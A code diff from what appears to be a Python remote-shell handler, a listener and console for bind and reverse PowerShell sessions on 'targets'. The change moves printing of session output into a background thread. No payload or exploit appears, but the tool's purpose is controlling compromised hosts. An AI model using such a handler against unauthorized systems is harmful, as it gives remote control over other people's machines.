@@ -69,14 +69,14 @@ def printListener():
             ipADDR = raw_input(t.bold_green + '[?] IP After Run Bind Shell on Target: ' + t.normal)
             connectserver = Server(ipADDR, 5556, bindsocket=False)
             serverlist.append(connectserver)
-            connectworker = Thread(target=asyncore.loop, args=(0.1,))
+            connectworker = threading.Thread(target=asyncore.loop, args=(0.1,))
             connectworker.setDaemon(True)
             connectworker.start()
     else:
         if not '5555' in str(serverlist):
             listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
             serverlist.append(listenerserver)
-            listenerworker = Thread(target=asyncore.loop, args=(0.1,))
+            listenerworker = threading.Thread(target=asyncore.loop, args=(0.1,))
             listenerworker.setDaemon(True)
             listenerworker.start()
     return "pass"
@@ -89,27 +89,37 @@ def interactShell(clientnumber):
     for server in serverlist:
         if clientnumber in server.handlers.keys():
             print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50
-            while server.handlers[clientnumber].in_buffer:
-                print server.handlers[clientnumber].in_buffer.pop()
+            e = threading.Event()
+            printer = threading.Thread(target=listenPrinter, args=(clientnumber, server, e))
+            printer.setDaemon(True)
+            printer.start()
             while True:
-                while sent:
-                    if server.handlers[clientnumber].in_buffer:
-                        print server.handlers[clientnumber].in_buffer.pop()
-                        sent = False
                 command = raw_input("PS >")
                 if command.lower() == "back":
+                    e.set()
                     break
                 elif command.lower() == "exit":
                     server.handlers[clientnumber].handle_close()
                     del clientMenuOptions[str(clientnumber)]
+                    e.set()
                     time.sleep(2)
                     break
                 elif command == "":
                     pass
                 else:
                     server.handlers[clientnumber].out_buffer.append(command)
-                    sent = True
     return "clear"
+
+
+def listenPrinter(clientnumber, server, e):
+    from menu import clientMenuOptions
+    while not e.isSet():
+        if server.handlers[clientnumber].in_buffer:
+            sys.stdout.write("\r" + " "*(len(readline.get_line_buffer())+2) + "\r")
+            print server.handlers[clientnumber].in_buffer.pop()
+            sys.stdout.write("PS >" + readline.get_line_buffer())
+            sys.stdout.flush()
+    sys.exit()
 
 def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
     if isExe:
